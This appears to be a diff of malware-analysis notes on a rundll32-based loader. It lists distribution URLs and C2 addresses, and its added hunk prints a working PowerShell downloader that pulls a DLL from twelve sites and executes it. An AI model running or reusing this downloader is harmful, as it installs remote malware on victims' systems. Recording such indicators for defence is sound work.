@@ -24,10 +24,39 @@ rundll32.exe C:\Windows\SysWOW64\Wmstlgnz\rkxihv.nhw,CQhUECct
 
 rundll32.exe C:\Windows\SysWOW64\Wmstlgnz\rkxihv.nhw,DllRegisterServer
 
+.pmg
+
+$path = "C{MMM}:\Pr{MMM}ogramD{MMM}ata\{MMM}JooSee.dll".replace('{MMM}','');
+$url1 = 'http://ttisecurity.com/cgi/7RFeiqkgymCs/';
+$url2 = 'http://tonysommers.net/eln-images/BowlvMV7raSyx8l/';
+$url3 = 'http://internationalstrategy.org/cgi/VT7we3QHAboswHu2ff/';
+$url4 = 'http://triangle-associates.com/ESW/Styles/yEHM2ir/';
+$url5 = 'http://hillyerassociates.com/cgi/qQV/';
+$url6 = 'http://robevansphotography.com/cgi/vNM8Ufvon3js/';
+$url7 = 'http://piedpiperdesigns.com/OLDSITE-DEC-2006/0OxPcj5Sjk/';
+$url8 = 'http://oakcourtpress.com/Guest/M/';
+$url9 = 'http://idesign-bruceberman.com/cgi/m7CP7jP7DPkcy/';
+$url10 = 'http://clairemauer.com/wp-admin/vXjSf8tAAMLwwWh3/';
+$url11 = 'http://joncicchettilandscapearchitect.com/eln-images/welcome/Pkoh97H/';
+$url12 = 'http://roketscience.com/cgi/qpTxCZiW0HqynNH/';
+
+
+$web = New-Object net.webclient;
+$urls = "$url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$url9,$url10,$url11,$url12".split(",");
+foreach ($url in $urls) {
+   try {
+       $web.DownloadFile($url, $path);
+       if ((Get-Item $path).Length -ge 30000) {
+           [Diagnostics.Process];
+           break;
+       }
+   }
+   catch{}
+} 
+Sleep -s 4;cmd /c C:\Windows\SysWow64\rundll32.exe 'C:\ProgramData\JooSee.dll',Mimic;
 
 .dll distro
 
-$path = "C{MMM}:\Pr{MMM}ogramD{MMM}ata\{MMM}JooSee.dll".replace('{MMM}','');
 http://ttisecurity.com/cgi/7RFeiqkgymCs/
 http://tonysommers.net/eln-images/BowlvMV7raSyx8l/
 http://internationalstrategy.org/cgi/VT7we3QHAboswHu2ff/
@@ -92,4 +121,3 @@ c2's
 185.157.82.211:8080
 217.182.143.207:443
 45.142.114.231:8080
-
